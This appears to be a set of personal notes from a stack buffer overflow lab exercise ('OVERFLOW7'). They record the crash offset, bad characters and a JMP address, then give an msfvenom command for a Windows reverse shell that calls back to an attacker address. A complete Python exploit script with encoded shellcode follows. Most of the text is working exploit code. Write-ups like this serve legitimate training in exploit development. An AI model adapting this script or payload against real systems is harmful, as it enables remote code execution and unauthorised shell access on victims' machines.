## fuzzing

![[Pasted image 20210530153226.png]]

## offset

EIP: 72423572

offset: 1306

![[Pasted image 20210530153426.png]]

## bad chars

ESP: 0188FA30

bardchars: `\x00\x8c\xae\xbe\xfb`

![[Pasted image 20210530153654.png]]

## jmp point

625011AF

little endian: `\xaf\x11\x50\x62`

![[Pasted image 20210530153950.png]]

## exploit 

`msfvenom -p windows/shell_reverse_tcp LHOST=10.17.4.208 LPORT=9001 EXITFUNC=thread -f c -a x86 --platform windows -b "\x00\x8c\xae\xbe\xfb"`

![[Pasted image 20210530154141.png]]

```python
import socket

ip = "10.10.171.241"
port = 1337

prefix = "OVERFLOW7 "
offset = 1306
overflow = "A" * offset
retn = "\xaf\x11\x50\x62"
padding = "\x90" * 16
payload = (
"\x29\xc9\x83\xe9\xaf\xe8\xff\xff\xff\xff\xc0\x5e\x81\x76\x0e"
"\x3f\x16\x21\x60\x83\xee\xfc\xe2\xf4\xc3\xfe\xa3\x60\x3f\x16"
"\x41\xe9\xda\x27\xe1\x04\xb4\x46\x11\xeb\x6d\x1a\xaa\x32\x2b"
"\x9d\x53\x48\x30\xa1\x6b\x46\x0e\xe9\x8d\x5c\x5e\x6a\x23\x4c"
"\x1f\xd7\xee\x6d\x3e\xd1\xc3\x92\x6d\x41\xaa\x32\x2f\x9d\x6b"
"\x5c\xb4\x5a\x30\x18\xdc\x5e\x20\xb1\x6e\x9d\x78\x40\x3e\xc5"
"\xaa\x29\x27\xf5\x1b\x29\xb4\x22\xaa\x61\xe9\x27\xde\xcc\xfe"
"\xd9\x2c\x61\xf8\x2e\xc1\x15\xc9\x15\x5c\x98\x04\x6b\x05\x15"
"\xdb\x4e\xaa\x38\x1b\x17\xf2\x06\xb4\x1a\x6a\xeb\x67\x0a\x20"
"\xb3\xb4\x12\xaa\x61\xef\x9f\x65\x44\x1b\x4d\x7a\x01\x66\x4c"
"\x70\x9f\xdf\x49\x7e\x3a\xb4\x04\xca\xed\x62\x7e\x12\x52\x3f"
"\x16\x49\x17\x4c\x24\x7e\x34\x57\x5a\x56\x46\x38\xe9\xf4\xd8"
"\xaf\x17\x21\x60\x16\xd2\x75\x30\x57\x3f\xa1\x0b\x3f\xe9\xf4"
"\x30\x6f\x46\x71\x20\x6f\x56\x71\x08\xd5\x19\xfe\x80\xc0\xc3"
"\xb6\x0a\x3a\x7e\x2b\x71\x3b\xc6\x49\x62\x3f\x35\x08\xe9\xd9"
"\x7c\x31\x36\x68\x7e\xb8\xc5\x4b\x77\xde\xb5\xba\xd6\x55\x6c"
"\xc0\x58\x29\x15\xd3\x7e\xd1\xd5\x9d\x40\xde\xb5\x57\x75\x4c"
"\x04\x3f\x9f\xc2\x37\x68\x41\x10\x96\x55\x04\x78\x36\xdd\xeb"
"\x47\xa7\x7b\x32\x1d\x61\x3e\x9b\x65\x44\x2f\xd0\x21\x24\x6b"
"\x46\x77\x36\x69\x50\x77\x2e\x69\x40\x72\x36\x57\x6f\xed\x5f"
"\xb9\xe9\xf4\xe9\xdf\x58\x77\x26\xc0\x26\x49\x68\xb8\x0b\x41"
"\x9f\xea\xad\xc1\x7d\x15\x1c\x49\xc6\xaa\xab\xbc\x9f\xea\x2a"
"\x27\x1c\x35\x96\xda\x80\x4a\x13\x9a\x27\x2c\x64\x4e\x0a\x3f"
"\x45\xde\xb5"
)

postfix = ""

buffer = prefix + overflow + retn + padding + payload  + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")
```
